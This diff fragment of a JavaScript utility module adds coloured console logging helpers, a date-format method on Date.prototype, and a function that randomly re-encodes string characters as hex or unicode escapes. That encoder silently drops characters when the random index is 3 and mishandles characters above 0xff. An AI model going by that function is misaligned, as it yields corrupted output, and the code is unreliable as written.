+    'greenBG'       : ['\x1B[42m', '\x1B[49m'],
+    'magentaBG'     : ['\x1B[45m', '\x1B[49m'],
+    'redBG'         : ['\x1B[41m', '\x1B[49m'],
+    'yellowBG'      : ['\x1B[43m', '\x1B[49m']
+};
+
+const generateColorStr = (color, str) => {
+    for(let i in styles){
+        if(i === color){
+            return `${styles[i][0]}${str}${styles[i][1]}`;
+        }
+    }
+}
+
+export const generateNewLog = (block, msg, color) => {
+    color = color || 'white';
+    return `${generateColorStr(color, `[ ${block.toUpperCase()} ]`)}:${msg}`;
+}
+
+export const addNewDefaultLog = (block, msg, color) => {
+    const str = generateNewLog(block, msg, color);
+    default_logs.push(str);
+    console.log(str);
+}
+
+/** 随机js字符串格式生成 */
+export const generateRandomFormatJString = str => {
+    let res = '';
+    for(const char of str){
+        switch(parseInt(Math.random() * 4)){
+            case 0:
+                res += char;
+                break;
+            case 1:
+                res += `\\x${char.charCodeAt().toString(16)}`;
+                break;
+            case 2:
+                res += `\\u00${char.charCodeAt().toString(16)}`;
+                break;
+        }
+    }
+    return res;
+}
+
+/** 时间格式化，抄的 */
+Date.prototype.Format = function (fmt) { //author: meizz 
+    var o = {
+        "M+": this.getMonth() + 1, //月份 
+        "d+": this.getDate(), //日 
+        "h+": this.getHours(), //小时 
+        "m+": this.getMinutes(), //分 
+        "s+": this.getSeconds(), //秒 
+        "q+": Math.floor((this.getMonth() + 3) / 3), //季度 
+        "S": this.getMilliseconds() //毫秒 
+    };
+    if (/(y+)/.test(fmt)) fmt = fmt.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+    if (new RegExp("(" + k + ")").test(fmt)) fmt = fmt.replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : (("00" + o[k]).substr(("" + o[k]).length)));
+    return fmt;
 }
